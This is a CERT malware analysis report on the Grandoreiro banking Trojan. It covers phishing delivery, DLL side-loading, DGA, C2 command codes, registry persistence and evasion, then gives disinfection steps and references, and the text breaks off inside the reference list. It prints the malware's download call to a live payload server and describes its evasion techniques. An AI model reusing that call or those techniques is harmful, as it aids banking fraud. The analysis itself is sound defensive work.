{
    "id": "2386de6a-3ff1-451b-ade8-743a727e4fd5",
    "created_at": "2023-08-31T02:08:13.216328Z",
    "updated_at": "2025-03-27T02:05:26.923599Z",
    "deleted_at": null,
    "sha1_hash": "9865307892eaea55d65825c2e1895e933b5b304a",
    "title": "Grandoreiro analysis study",
    "authors": "",
    "file_creation_date": "2022-05-23T16:00:33Z",
    "file_modification_date": "2022-05-23T16:02:21Z",
    "file_size": 2665697,
    "plain_text": "## Grandoreiro analysis study\n\n\n-----\n\n**_June 2022_**\n\n**INCIBE-CERT_STUDY_GRANDOREIRO_ANALYSIS_2022_v1**\n\n\nThis publication belongs to INCIBE (Spanish National Cybersecurity Institute) and is licensed under a Creative Commons\nAttribution-Non-commercial 3.0 Spain License. For this reason, it is permitted to copy, distribute and communicate this work\npublicly under the following conditions:\n\n- Acknowledgement. The content of this report may be reproduced in part or in full by third parties, with the appropriate\nacknowledgement and making express reference to INCIBE or INCIBE-CERT and its website: [https://www.incibe.es/. Under no](https://www.incibe.es/)\ncircumstances shall said acknowledgement imply that INCIBE supports said third party or supports the use they make of this\nwork.\n\n- Non-commercial Use. The original material and the derived works may be distributed, copied and exhibited provided their use\ndoes not have a commercial purpose.\n\nBy reusing or distributing the work, the terms of the license of this work must be made clear. Some of these conditions may not\napply if permission is obtained from INCIBE-CERT as owner of the authorship rights. Full text of the license:\n[https://creativecommons.org/licenses/by-nc-sa/3.0/es/.](https://creativecommons.org/licenses/by-nc-sa/3.0/es/)\n\n\n-----\n\n# Index\n\n###### INDEX OF GRAPHICS .......................................................................................... 3 INDEX OF TABLES ............................................................................................... 4 1. About this study ............................................................................................... 5 2. Document structure ......................................................................................... 6 3. Introduction ...................................................................................................... 7 4. Technical report ............................................................................................... 8\n\n 4.1. Infection methods ......................................................................................... 8 4.2. Programming language, functions and mode of operation ........................... 8 4.3. Protection methods used by the Trojan ...................................................... 26\n\n 5. Detection and disinfection ............................................................................. 28\n\n 5.1. Detection and disinfection methods ........................................................... 28 5.2. Recommendations ..................................................................................... 28\n\n 6. References ...................................................................................................... 29 Appendix 1: Indicators of compromise (IOC) .................................................. 31 Appendix 2: Yara Rules of detection ............................................................... 33\n\n#### INDEX OF GRAPHICS\n\nFigure 1: Process of infection with the Grandoreiro banking Trojan .................................................. 8\nFigure 2: dll downloader compiled with Borland Delphi 7 .................................................................. 9\nFigure 3: Trojan dll compiled with Borland Delphi 7 ........................................................................... 9\nFigure 4: Sample source of analysis .................................................................................................. 9\nFigure 5: Final Trojan download URL............................................................................................... 10\nFigure 6: User language check ........................................................................................................ 10\nFigure 7: Server hosting the payload ............................................................................................... 11\nFigure 8: Simulation of the infection process ................................................................................... 11\nFigure 9: Directory with several files ................................................................................................ 12\nFigure 10: Window of solodriver.exe when the dll is not in execution.............................................. 12\nFigure 11: Applications in the Trojan's execution directory .............................................................. 13\nFigure 12: ISO images inside that make the file larger than usual .................................................. 13\nFigure 13: Comparing the main language with the Portuguese language ....................................... 14\nFigure 14: Comparing the main language with the Spanish language ............................................ 14\nFigure 15: Examples of use of the RTC Portal component .............................................................. 15\nFigure 16: Finding the solodriver.exe window in order to hide it ...................................................... 15\nFigure 17: Looking for the window to hide it ..................................................................................... 16\nFigure 18: Searched windows linked to Spanish banks ................................................................... 16\nFigure 19: Searched windows linked to Portuguese banks ............................................................. 16\nFigure 20: Decryption of chain in order to be used .......................................................................... 17\nFigure 21: String decryption algorithm ............................................................................................. 17\nFigure 22: String to be decrypted and the key it uses ...................................................................... 17\nFigure 23: Example of some of the words related to the banks intended to be supplanted ............ 18\nFigure 24: Cleaning DNS cache before generating dynamic domains ............................................ 18\nFigure 25: DGA generation zone...................................................................................................... 19\nFigure 26: The process of generating dynamic domains ................................................................. 19\nFigure 27: Starting to collect data from the affected equipment ...................................................... 19\nFigure 28: Process of obtaining the name of the PC ....................................................................... 19\n\n\n-----\n\nFigure 29: Data collected in order to be sent ................................................................................... 20\nFigure 30: Use of the RTC HTTP component for communication with Command and Control ...... 20\nFigure 31: DLL update ...................................................................................................................... 21\nFigure 32: Command to disconnect the victim ................................................................................. 21\nFigure 33: Machine reboot process .................................................................................................. 21\nFigure 34: Trojan reset command sending area .............................................................................. 22\nFigure 35: Cursor information query................................................................................................. 22\nFigure 36: Command to control the cursor ....................................................................................... 22\nFigure 37: Create UPAK.BIN file ...................................................................................................... 22\nFigure 38: Creating the log to record the activity ............................................................................. 23\nFigure 39: Delete the log file ............................................................................................................ 23\nFigure 40: Searches in-memory processes ..................................................................................... 23\nFigure 41: Preparing data to be sent ................................................................................................ 24\nFigure 42: Disable scrolling .............................................................................................................. 24\nFigure 43: Self-deletion .................................................................................................................... 25\nFigure 44: Examples of network encrypted files .............................................................................. 25\nFigure 45: Registration key name .................................................................................................... 25\nFigure 46: Register key writing zone to ensure persistence ............................................................ 26\nFigure 47: Software searching the infected equipment .................................................................... 26\nFigure 48: Debug check with IsDebuggerPresent............................................................................ 26\n\n#### INDEX OF TABLES\n\nTable 1. .bat script intended to delete the Trojan and its components ............................................ 28\nTable 2. Financial institutions affected by Grandoreiro .................................................................... 32\n\n\n-----\n\n### 1. About this study\n\nThis study sets forth the results of the analysis conducted on the Grandoreiro banking\nTrojan, also known as Delephant. As a trojan, this malware is designed to have multiple\nuses, the most common of which is to create a backdoor on the infected equipment to be\nable to download updates and new functions.\n\nThe aim of the study is to gather the necessary information to identify the characteristics of\nthis threat as well as its behaviour and techniques used, allowing traceability of future\nversions of the same malware, or its potential impact on other entities in the financial sector,\nor even in other sectors.\n\nIn addition, there is evidence of the spread of operations conducted with this malware to\nEurope, including Spain and Portugal, and it has been active in Latin America since 2015.\n\nThe actions carried out for its preparation comprise an analysis within a controlled\nenvironment. The general information obtained is that Grandoreiro is a Trojan developed in\nDelphi, a programming language popular for Brazilian malware. It is distributed via phishing,\nthat is, e-mail campaigns that send malicious attachments or links that redirect to fraudulent\nweb pages alerting the user to install fake Java or Flash application updates.\n\nOnce its low-level modus operandi has been described, a series of countermeasures are\nprovided to detect this Trojan and, if necessary, to disinfect the affected computer.\n\n\n-----\n\n### 2. Document structure\n\nThis document comprises a 3.- Introduction part presenting the type of threat that the\nGrandoreiro Trojan represents, and mentions its main purpose and some of its\ncharacteristics\n\nSubsequently, a 4.-Technical report part provides detailed information on the infection\nroutes used by this Trojan, the language in which it is programmed, its functionalities and\nmode of action, describing the infection process step by step, as well as the protection\nmethods used by Grandoreiro to evade security controls.\n\nSubsequently, recommendations and actions to detect the Grandoreiro threat, as well as\nthe cleaning process, are provided in section 5.- Detection and disinfection .\n\nFinally, section 6.- References lists the references consulted throughout the analysis.\n\nIn addition, the document has two annexes: Appendix 1: Indicators of compromise (IOC)\nincludes the indicator of commitment (IOC) associated to Grandoreiro and Appendix 2: Yara\nRules of detection comprises the Yara rules for the detection malicious samples of this\nTrojan.\n\n\n-----\n\n### 3. Introduction\n\nGrandoreiro, is one of the many banking Trojans originating in South America that has\nspread its operations to other regions, mainly to Europe. According to ESET researchers, it\nhas been active since 2015, affecting Latin American countries, mainly Brazil, its country of\norigin.\n\nAccording to researchers, Grandoreiro authors update its code at a remarkable speed, and\neven suspect that two variants exist simultaneously, and in 2019 expanded worldwide to\nbanks in Spain, Mexico and Portugal, as well as adjusting the themes of its distribution\ncampaigns by taking advantage of the disinformation campaigns and hoaxes surrounding\nCOVID-19 at the height of the pandemic, especially during 2020.\n\n\n-----\n\n### 4. Technical report\n\n##### 4.1. Infection methods\n\nThe most common method of Trojan infection consists of several stages; fist, the target user\nreceives an e-mail which contains a URL pointing to a fraudulent page. By clicking on the\nlink included in the fraudulent email received, the user unknowingly downloads the first\nelement of the process. This is an installer file which, in turn, will download the payload\ncontaining the banking Trojan. However, occasionally this file may be included in the e-mail\nas an attachment.\n\n**_Figure 1: Process of infection with the Grandoreiro banking Trojan_**\n\n##### 4.2. Programming language, functions and mode of operation\n\n**_Grandoreiro in a banking Trojan whose name was inspired by the_** [large volume of binaries](https://www.welivesecurity.com/la-es/2020/04/28/grandoreiro-troyano-bancario-dirigido-brasil-espana-mexico-peru/)\n[generated by the attackers, which exceeded 250 MB. This made it difficult its analysis on](https://www.welivesecurity.com/la-es/2020/04/28/grandoreiro-troyano-bancario-dirigido-brasil-espana-mexico-peru/)\nthe different online sandboxes platforms, as it exceeded the allowed limit by far.\n\nSeveral binaries are involved in user engagement. It starts from the initial binary that is\ndownloaded by the victim. This binary is a compressed file containing an installer. It contains\n(msi extension) is the dll **_(sha256sum:_**\n**_58084c86acd68c83d84802ef8daa9cdfefdcf34d7fa1b9a0e04c4ca124e58382) that acts_**\nas a **downloader (malware that downloads the threat from the Internet to the victim's**\ncomputer). This binary is programmed in Delphi and compiled with Borland Delphi 7.\n\n\n-----\n\n**_Figure 2: dll downloader compiled with Borland Delphi 7_**\n\n\nThe second dll (sha256sum:\n**_35c0744bec0e123d24a9ffd3d7a9edeb07d9341ab45619b5fc881ce7dd81276a) and_**\nwhich will be discussed later in the study, belongs to the Grandoreiro banking Trojan\nfamily.\n\nAs above, programmed in Delphi and compiled with Borland Delphi 7.\n\n\n**_Figure 3: Trojan dll compiled with Borland Delphi 7_**\n\n\n**_Figure 4: Sample source of analysis_**\n\nIt is a compressed file. Inside there is an installer (msi), which will download the payload\ncontaining the banking Trojan.\n\nIn the embedded dll, you can see where the URL is located and where the payload can be\nfound; this payload is encrypted so as not to be detected from the start by analysis tools.\n\n\n-----\n\n**_Figure 5: Final Trojan download URL_**\n\nFist, the user language is verified, and users having set up English as their language are\nrejected; if such a user is detected, the process ended. In this way, they ensure that the\ntarget user matches their intended target, and would prevent it from being executed as usual\non any sandbox platform whose language is English.\n\n**_Figure 6: User language check_**\n\nOnce you have the URL in the correct format, removing filler characters, download the file\nshown below.\n\n\n-----\n\n**_Figure 7: Server hosting the payload_**\n\nThe dll downloads and completes the code so that it can be decompressed later in the\nexpected path. The attackers make sure that the server registers the user's language, as it\nis intended for Spanish users. They add the language to the URL and use the\n_URLDownloadToFile API function:_\n\n```\nURLDownloadToFile(http://149.56.251.1:51551/esgrime.zip?Español (Spanish,\ninternational), C:\\Users\\<user>\\AppData\\Roaming\\nowview\\AX3346546774.zip)\n\n```\n\nThis file will be stored under path\n_C:\\Users>AppData\\Roaming\\nownowview\\AX3346546774.zip._\n\n**_Figure 8: Simulation of the infection process_**\n\nAfter several mathematical operations based on XOR, a zip file is generated in which it can\nbe unzipped, leaving the dll placed next to the executable (and 2 other dll that the\nexecutable needs), which will be in charge of launching the infection process. The contents\nof the downloaded file are decrypted and then decompressed, and a series of files are\nplaced in the directory.\n\n\n-----\n\n**_Figure 9: Directory with several files_**\n\nThe malicious dll is dbghelp.dll, which, since it is located in the same directory, will be loaded\nas a regular dll by the solodriver.exe executable; this is the first place where it will be looked\nfor, ignoring the legitimate one in the system.\n\nThe application solodriver.exe is part of the Advanced Installer 18.6.1 software and is called\n_intune.exe._\n\nTherefore, they use a legitimate application to load the malicious dll which controls that the\nmain application window remains hidden and is not visible, although at the moment of\nexecution it is briefly displayed before it is hidden again.\n\nIf the malicious dll is removed from the same directory where _solodriver.exe is located is_\nexecuted, we can see what it really looks like and identify that this file hides the Trojan\ncontrolling the displayed windows.\n\n**_Figure 10: Window of solodriver.exe when the dll is not in execution_**\n\n\n-----\n\nApparently, any action triggered by the dll will appear to be performed by _solodriver.exe,_\nsince it is in the memory of the executable as just another dll.\n\n**_Figure 11: Applications in the Trojan's execution directory_**\n\nThe dynamic library _dbghelp.dll is a sizeable (255M) library, which makes it difficult to_\nanalyse it with certain applications, as often those are limited to smaller binaries, as is the\ncase with many online malware analysis platforms.\n\nOpening the file with a resource editor reveals why it is so large: it contains 2 ISO-type\nsimilar images.\n\n**_Figure 12: ISO images inside that make the file larger than usual_**\n\nThe first, MBJDJDBHWDX.bmp, takes 128 MB while the second, ZCCFMYWMGGO.bmp,\nweighs 118 MB.\n\n\n-----\n\nAs the campaign is aimed at users in Spain and Portugal, it seeks to ensure that the\nlanguage configuration is country-specific.\n\n**_Figure 13: Comparing the main language with the Portuguese language_**\n\n**_Figure 14: Comparing the main language with the Spanish language_**\n\nFigure 15 makes use of the RTC Portal component. This component is specially designed\nfor remote desktop control, file sharing and chat applications. As its own website [states,](https://rtc.teppi.net/details/)\nRealThinClient SDK is a flexible and modular framework for building reliable and scalable\ncross-platform Applications with Delphi, designed for the Web by utilizing HTTP/S with full\nIPv4 & IPv6 support and built-in multi-threading, extensively stress-tested to ensure the\nhighest stability. By using non-blocking event-driven communication with built-in threadpooling, applications built with the RealThinClient SDK can handle thousands of active\nconnections by using a limited number of threads in a real multi-threaded environment, on\nall supported platforms.”\n\n\n-----\n\n**_Figure 15: Examples of use of the RTC Portal component_**\n\nWhen the application is started, a series of timers are created. Those timers will periodically\ncheck what is going on in the computer, as well as hide the application used to load the dll.\n\n**_Figure 16: Finding the solodriver.exe window in order to hide it_**\n\nFirst, it uses _FindWindowA API to search for the window with the title \"Visual Studio_\nUltimate\" and if found, use its handle to hide it with ShowWindow.\n\n\n-----\n\n**_Figure 17: Looking for the window to hide it_**\n\nAnother periodic process is to check that banks are accessed, looking for a series of strings\nin the active windows.\n\n**_Figure 18: Searched windows linked to Spanish banks_**\n\n**_Figure 19: Searched windows linked to Portuguese banks_**\n\n\n-----\n\nNot all strings are directly accessible in the binary, but when needed, they are decrypted\nfollowing an XOR-based algorithm. This takes into account the encrypted string with a key.\nThe method consists on running through the string and performing character-by-character\noperations taking into account its current position and the previous position in between.\n\n**_Figure 20: Decryption of chain in order to be used_**\n\n**_Figure 21: String decryption algorithm_**\n\n**_Figure 22: String to be decrypted and the key it uses_**\n\n\n-----\n\n**_Figure 23: Example of some of the words related to the banks intended to be supplanted_**\n\nIf any of them are found during the running processes, it prepares to generated the dynamic\ndomains that will be queried. Before, it runs the command \"ipconfig /flushdns\" to clear the\nDNS cache.\n\n**_Figure 24: Cleaning DNS cache before generating dynamic domains_**\n\nThen, using a base of 11 predefined domains, it generates the final dynamic domains\naccording to the Domain Generator Algorithm (DGA), as shown at Figure 25.\n\n\n-----\n\n**_Figure 25: DGA generation zone_**\n\nTherefore, 80 different dynamic domains are generated in this way.\n\n**_Figure 26: The process of generating dynamic domains_**\n\nOnce the process is finished, it gets the name of the PC and decrypts one of the strings it\nneeds to report to Command and Control. These strings are encrypted within the binary.\n\n**_Figure 27: Starting to collect data from the affected equipment_**\n\nEach country has an associated identifier (7236), and when it detects that one of them is\nbeing visited, it associates it to this corresponding value in order to report this.\n\n**_Figure 28: Process of obtaining the name of the PC_**\n\n\n-----\n\nAn example of the data to be sent is presented at Figure 29 . The name of the affected\nequipment has been obfuscated.\n\n**_Figure 29: Data collected in order to be sent_**\n\nThis communication is done with the above-mentioned RTC component.\n\n**_Figure 30: Use of the RTC HTTP component for communication with Command and Control_**\n\nOther main functionalities of this Trojan include the following:\n\n It has the ability to update the malicious dll. For this purpose, the word\n\n_UpdateDLLMODULO is used._ This process would download a zip file with the same\nname as the dll, unzip it and halt the process to resume it later. In order to do this, a bat\nfile called cookie.bat is created and added to the actions mentioned above.\n\n\n-----\n\n**_Figure 31: DLL update_**\n\n It has the ability to disconnect the victim using the code SUSPENDEACESSO, to reboot\n\nthe machine using the code REINICIAGERAL, or to reboot the Trojan itself using the\ncode Rein1c1aSystem.\n\n**_Figure 32: Command to disconnect the victim_**\n\n**_Figure 33: Machine reboot process_**\n\n\n-----\n\n**_Figure 34: Trojan reset command sending area_**\n\n It has the capability to obtain information on cursor use (code EXIBIRMZ).\n\n**_Figure 35: Cursor information query_**\n\n And to control the user's cursor (code OCULTARMZ).\n\n**_Figure 36: Command to control the cursor_**\n\n It can create a registry file, called UPAK.BIN, using the code CRIARCADASTRO.\n\n**_Figure 37: Create UPAK.BIN file_**\n\n It has the ability to create an activity log in a log called _lz.log, using the code_\n\n_MARCARPC._\n\n\n-----\n\n**_Figure 38: Creating the log to record the activity_**\n\n It can use the code DEL3TARMARC0AO to delete the file lz.log, as a log mentioned\n\nabove, in the same path as the executable.\n\n**_Figure 39: Delete the log file_**\n\n It has the capacity to search the processes in memory using the code\n\n_DETONATEPROCESS._\n\n**_Figure 40: Searches in-memory processes_**\n\n It has the ability to take screenshots, using the codes _ATIVARCAPTURAMAG and_\n\n_ATIVARCAPTURAFULL. The difference the method used to perform this action: if the_\n\n\n-----\n\noperating systems are Windows 10, 8.1 and Server, then it uses of the _MAG_\n_\"Magnification\" DLL, otherwise it uses the FULL option._\n\n**_Figure 41: Preparing data to be sent_**\n\n It can deactivate the scroll bar using the code DISABLESCROOL.\n\n**_Figure 42: Disable scrolling_**\n\n It deletes both the entire directory where the Trojan is located using the DELETEAKL\n\ncode, and the registry key, as if it had never existed.\n\n\n-----\n\n**_Figure 43: Self-deletion_**\n\nIt is therefore possible to tamper with windows that have been opened by the user, to\ncapture the user’s keystrokes and to simulate keyboard and mouse actions. At the same\ntime, it can control the user's browsing or blocking access to websites chosen by the\nattacker.\n\n**Persistence** is ensured by creating a shortcut to it in the registry key\n_HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Uvnerjnx (this key may vary_\nfrom case to case), pointing to _C:\\User\\appdata\\roaming\\nownowviewview\\solodriver.exe_\n(as the executable name and path may be different in other samples).\n\n**_Figure 44: Examples of network encrypted files_**\n\n**_Figure 45: Registration key name_**\n\n\n-----\n\n**_Figure 46: Register key writing zone to ensure persistence_**\n\nThus, every time the computer is rebooted, the Trojan will be executed and will be able to\ncontinue collecting and using any information it may need to communicate with the C&C.\n\n##### 4.3. Protection methods used by the Trojan\n\nThe Trojan tries to protect itself from anti-malware software most widely used in Latin\nAmerica, such as IBM Trusteer and Warsaw Diebold.\n\n**_Figure 47: Software searching the infected equipment_**\n\nA standard measure that many Trojans use is to verify whether they are being debugged,\nthanks to the Windows IsDebuggerPresent API.\n\n**_Figure 48: Debug check with IsDebuggerPresent_**\n\nGrandoreiro's technique for obfuscating malicious binaries in order to go undetected, which\ntries to make binaries so large that malware analysis platforms are unable to detect it due\nto their delivery size limitations, is known as binary padding. It is filled with large images for\nno other purpose than to make the binary such a size that makes it difficult to analyse.\n\n\n-----\n\nThe use of legitimate and signed applications loading the dll with a legitimate and existing\nname in the operating system, but in the same directory as the executable (first in the dll\nloading path), which causes it to load earlier than expected, makes detection more difficult.\n\n\n-----\n\n### 5. Detection and disinfection\n\n##### 5.1. Detection and disinfection methods\n\nMany anti-virus software programmes are capable of detecting this threat, so it would be\nadvisable to have anti-virus software and anti-spam tools installed and updated.\n\nIn cases where the first touchpoint is a Microsoft Office document, disable the macro\nautomatic execution function, and, above all, be wary of any unknown senders and do not\ninstall files from unreliable sources under any circumstances.\n\nFor disinfection, it is necessary to delete the registry key associated with persistence. In the\nanalysed sample the registration key is _Uvnerjnx. However, it can be different in other_\ncases. In addition to interrupting the executable that uses the dll, in order to ensure that the\naction does not fail due to the fact that the executable was still running and the Trojan dll\nwas active. Therefore, the following script is valid when the registry key, the path and the\nname of the executable match. In other cases, these values must be changed to ensure\nthat they match.\n```\n Key=”Uvnerjnx”\n Executable=”solodriver.exe”\n Path=”nowview”\n reg delete\n HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v\n %Clave% /f\n taskkill /f /im %Executable%\n del /F %APPDATA%\\%Path%\\*.exe\n del /F %APPDATA%\\%Path%\\*.dll\n rmdir /s /q %APPDATA%\\%Path%\n\n```\n**_Table 1. .bat script intended to delete the Trojan and its components_**\n\n##### 5.2. Recommendations\n\nIn order to avoid getting infected with the Grandoreiro malware, it is advisable to apply the\nfollowing measures:\n\n Ignore irrelevant emails and emails that are sent from an unknown address or include\n\nan attachment (or a link to a website) and never open files or web links included in such\nthese emails before ensuring that it is perfectly safe to do so.\n Only download software from official websites and via direct download links.\n Update installed programs through implemented functions or tools provided by official\n\nsoftware developers. The same applies to activating software.\n Regularly scan the operating system for threats with a trustworthy anti-virus or anti\nspyware suite and ensure that this software is kept updated.\n\n\n-----\n\n### 6. References\n\n Alberto Payo “El troyano bancario brasileño Grandoreiro vuelve a amenazar a los\n\nusuarios españoles” [https://www.escudodigital.com/ciberseguridad/troyano-bancario-](https://www.escudodigital.com/ciberseguridad/troyano-bancario-brasileno-grandoreiro-vuelve_50335_102.html)\n[brasileno-grandoreiro-vuelve_50335_102.html](https://www.escudodigital.com/ciberseguridad/troyano-bancario-brasileno-grandoreiro-vuelve_50335_102.html) (Dec 06, 2021) Last accessed: Feb. 03,\n2022.\n Aitor Echavarri “Campaña Grandoreiro Mercadona” [https://botechfpi.com/campana-](https://botechfpi.com/campana-grandoreiro-mercadona)\n\n[grandoreiro-mercadona (Aug. 19, 2020) Last accessed: Feb. 03, 2022.](https://botechfpi.com/campana-grandoreiro-mercadona)\n Grandoreiro-Bcsc-Malware-Grandoreiro\n\n[https://www.basquecybersecurity.eus/archivos/202104/bcsc-malware-grandoreiro-](https://www.basquecybersecurity.eus/archivos/202104/bcsc-malware-grandoreiro-tlpwhite_v2.pdf)\n[tlpwhite_v2.pdf Last accessed: Feb. 08, 2022.](https://www.basquecybersecurity.eus/archivos/202104/bcsc-malware-grandoreiro-tlpwhite_v2.pdf)\n Check Point and Europol \"Banking Trojans: From Stone Age to Space Era [\"](https://www.europol.europa.eu/cms/sites/default/files/documents/banking_trojans_from_stone_age_to_space_era.pdf)\n\n[https://www.europol.europa.eu/cms/sites/default/files/documents/banking_trojans_fro](https://www.europol.europa.eu/cms/sites/default/files/documents/banking_trojans_from_stone_age_to_space_era.pdf)\n[m_stone_age_to_space_era.pdf (March 21, 2017) Last accessed: Feb. 04, 2022.](https://www.europol.europa.eu/cms/sites/default/files/documents/banking_trojans_from_stone_age_to_space_era.pdf)\n Cytomic “Vuelve el troyano Grandoreiro contra las entidades bancarias aprovechando\n\nel COVID-19” [https://www.cytomic.ai/es/alertas/troyano-grandoreiro-ataque-banca/](https://www.cytomic.ai/es/alertas/troyano-grandoreiro-ataque-banca/)\n(May 20, 2019) Last accessed: Feb. 14, 2022.\n Cybersecurityadmin\" Grandoreiro: How engorged can an EXE get?\"\nhttps://nofalsepositives.com/grandoreiro-how-engorged-can-an-exe-get (Jan. 08, 2022)\nLast accessed: Feb. 04, 2022.\n Dani Abramov and Limor Kessem \"Grandoreiro Malware Now Targeting Banks in Spain\"\n\nSecurity Intelligence [https://securityintelligence.com/posts/grandoreiro-malware-now-](https://securityintelligence.com/posts/grandoreiro-malware-now-targeting-banks-in-spain/)\n[targeting-banks-in-spain/ (Apr. 13, 2020) Last accessed: Feb. 02, 2022.](https://securityintelligence.com/posts/grandoreiro-malware-now-targeting-banks-in-spain/)\n David Garcia “El troyano bancario Faketoken ha vuelto: analizamos su funcionamiento”\n\nRevelock. [https://www.revelock.com/es/blog/el-troyano-faketoken-ha-vuelto-](https://www.revelock.com/es/blog/el-troyano-faketoken-ha-vuelto-analizamos-su-funcionamiento)\n[analizamos-su-funcionamiento (Feb. 17, 2020) Last accessed: Feb. 03, 2022.](https://www.revelock.com/es/blog/el-troyano-faketoken-ha-vuelto-analizamos-su-funcionamiento)\n David Garcia “Fraude basado en inyecciones de código y phishing”\n[https://www.revelock.com/es/blog/grandoreiro-un-malware-con-una-estrategia-de-](https://www.revelock.com/es/blog/grandoreiro-un-malware-con-una-estrategia-de-fraude-basada-en-inyecciones-de-codigo-y-phishing-para-interceptar-credenciales)\n[fraude-basada-en-inyecciones-de-codigo-y-phishing-para-interceptar-credenciales](https://www.revelock.com/es/blog/grandoreiro-un-malware-con-una-estrategia-de-fraude-basada-en-inyecciones-de-codigo-y-phishing-para-interceptar-credenciales)\n(Jan. 02, 2021) Last accessed: Feb. 02, 2022.\n Ehacking “Phishing que invita a descargar copia de seguridad de WhatsApp descarga\n\nel troyano Grandoreiro”. Ethical Hacking Consultants\n[https://blog.ehcgroup.io/2021/10/12/14/00/14/11933/phishing-que-invita-a-descargar-](https://blog.ehcgroup.io/2021/10/12/14/00/14/11933/phishing-que-invita-a-descargar-copia-de-seguridad-de-whatsapp-descarga-el-troyano-grandoreiro/seguridad-informatica/troyanos/ehacking/)\n[copia-de-seguridad-de-whatsapp-descarga-el-troyano-grandoreiro/seguridad-](https://blog.ehcgroup.io/2021/10/12/14/00/14/11933/phishing-que-invita-a-descargar-copia-de-seguridad-de-whatsapp-descarga-el-troyano-grandoreiro/seguridad-informatica/troyanos/ehacking/)\n[informatica/troyanos/ehacking/ (Oct. 12, 2021). Last accessed: Feb. 04, 2022.](https://blog.ehcgroup.io/2021/10/12/14/00/14/11933/phishing-que-invita-a-descargar-copia-de-seguridad-de-whatsapp-descarga-el-troyano-grandoreiro/seguridad-informatica/troyanos/ehacking/)\n ESET Research “Grandoreiro: análisis de un troyano bancario dirigido a Brasil, España,\n\nMéxico y Perú” [https://www.welivesecurity.com/la-es/2020/04/28/grandoreiro-troyano-](https://www.welivesecurity.com/la-es/2020/04/28/grandoreiro-troyano-bancario-dirigido-brasil-espana-mexico-peru/)\n[bancario-dirigido-brasil-espana-mexico-peru/](https://www.welivesecurity.com/la-es/2020/04/28/grandoreiro-troyano-bancario-dirigido-brasil-espana-mexico-peru/) (Apr. 28, 2020). Last accessed: Feb. 04,\n2022.\n ESET Research “Desde Amavaldo a Zumanek: un análisis de 12 troyanos bancarios\n\nde América Latina” [https://www.welivesecurity.com/la-es/2021/12/15/analisis-12-](https://www.welivesecurity.com/la-es/2021/12/15/analisis-12-troyanos-bancarios-america-latina/)\n[troyanos-bancarios-america-latina/](https://www.welivesecurity.com/la-es/2021/12/15/analisis-12-troyanos-bancarios-america-latina/) (Dec. 15, 2021) Last accessed: Feb. 02, 2022.\n ESET Research “Indicadores muestran la cooperación entre autores de troyanos\n\nbancarios de América Latina” [https://www.welivesecurity.com/la-](https://www.welivesecurity.com/la-es/2020/10/01/indicadores-muestran-cooperacion-entre-autores-troyanos-bancarios-america-latina/)\n[es/2020/10/01/indicadores-muestran-cooperacion-entre-autores-troyanos-bancarios-](https://www.welivesecurity.com/la-es/2020/10/01/indicadores-muestran-cooperacion-entre-autores-troyanos-bancarios-america-latina/)\n[america-latina/ (Oct. 1, 2020) Last accessed: Feb. 04, 2022.](https://www.welivesecurity.com/la-es/2020/10/01/indicadores-muestran-cooperacion-entre-autores-troyanos-bancarios-america-latina/)\n\n\n-----\n\n INCIBE “Estudio del análisis de FluBot” [https://www.incibe-](https://www.incibe-cert.es/sites/default/files/contenidos/estudios/doc/incibe-cert_estudio_analisis_flubot_2021_v1.pdf%20/)\n[cert.es/sites/default/files/contenidos/estudios/doc/incibe-](https://www.incibe-cert.es/sites/default/files/contenidos/estudios/doc/incibe-cert_estudio_analisis_flubot_2021_v1.pdf%20/)\n[cert_estudio_analisis_flubot_2021_v1.pdf /](https://www.incibe-cert.es/sites/default/files/contenidos/estudios/doc/incibe-cert_estudio_analisis_flubot_2021_v1.pdf%20/) (May, 2021) Last accessed: Feb. 15, 2022.\n Infobae “México, Brasil y España, los países más afectados por ataques cibernéticos\n\nbancarios” [https://www.infobae.com/america/tecno/2021/12/17/mexico-brasil-y-](https://www.infobae.com/america/tecno/2021/12/17/mexico-brasil-y-espana-los-paises-mas-afectados-por-ataques-ciberneticos-bancarios/)\n[espana-los-paises-mas-afectados-por-ataques-ciberneticos-bancarios/ (Dec. 17, 2021)](https://www.infobae.com/america/tecno/2021/12/17/mexico-brasil-y-espana-los-paises-mas-afectados-por-ataques-ciberneticos-bancarios/)\nLast accessed: Feb. 01, 2022.\n IT News “ESET amplía la investigación sobre el troyano bancario Grandoreiro”\n\n[https://itnews.lat/eset-ampl-a-la-investigaci-n-sobre-el-troyano-bancario-](https://itnews.lat/eset-ampl-a-la-investigaci-n-sobre-el-troyano-bancario-grandoreiro.html)\n[grandoreiro.html (Apr. 28, 2021) Last accessed: Feb. 04, 2022.](https://itnews.lat/eset-ampl-a-la-investigaci-n-sobre-el-troyano-bancario-grandoreiro.html)\n José Manuel Roviralta Puente “Ataques de inyección SQL, una amenaza para tu web”\n\n[https://www.incibe.es/protege-tu-empresa/blog/ataques-inyeccion-sql-amenaza-tu-](https://www.incibe.es/protege-tu-empresa/blog/ataques-inyeccion-sql-amenaza-tu-web)\n[web](https://www.incibe.es/protege-tu-empresa/blog/ataques-inyeccion-sql-amenaza-tu-web) INCIBE (Oct 26, 2021) Last accessed: Feb. 6, 2022\n Kaspersky Lab \"The Tetrade: Brazilian banking malware goes global [\"](https://securelist.com/the-tetrade-brazilian-banking-malware/97779/)\n[https://securelist.com/the-tetrade-brazilian-banking-malware/97779/ (July. 14, 2020)](https://securelist.com/the-tetrade-brazilian-banking-malware/97779/)\nLast accessed: Feb. 02, 2022.\n Open Web Application Security Project \"Man-in-the-browser attack\n[\"https://owasp.org/www-community/attacks/Man-in-the-browser_attack](https://owasp.org/www-community/attacks/Man-in-the-browser_attack) Date last\naccessed: Feb. 03, 2022.\n OSI “Copia de seguridad de mensajes de WhatsApp” nuevo correo electrónico\n\nfraudulento que descarga malware\n[https://www.osi.es/es/actualidad/avisos/2021/09/copia-de-seguridad-de-mensajes-de-](https://www.osi.es/es/actualidad/avisos/2021/09/copia-de-seguridad-de-mensajes-de-whatsapp-nuevo-correo-electronico)\n[whatsapp-nuevo-correo-electronico](https://www.osi.es/es/actualidad/avisos/2021/09/copia-de-seguridad-de-mensajes-de-whatsapp-nuevo-correo-electronico) (Sept. 22, 2021) Last accessed: Feb. 03, 2022.\n Pedro Tavares \"The updated Grandoreiro Malware equipped with latenbot-C2 features\n\n[in Q2 2020 now extended to Portuguese banks \" 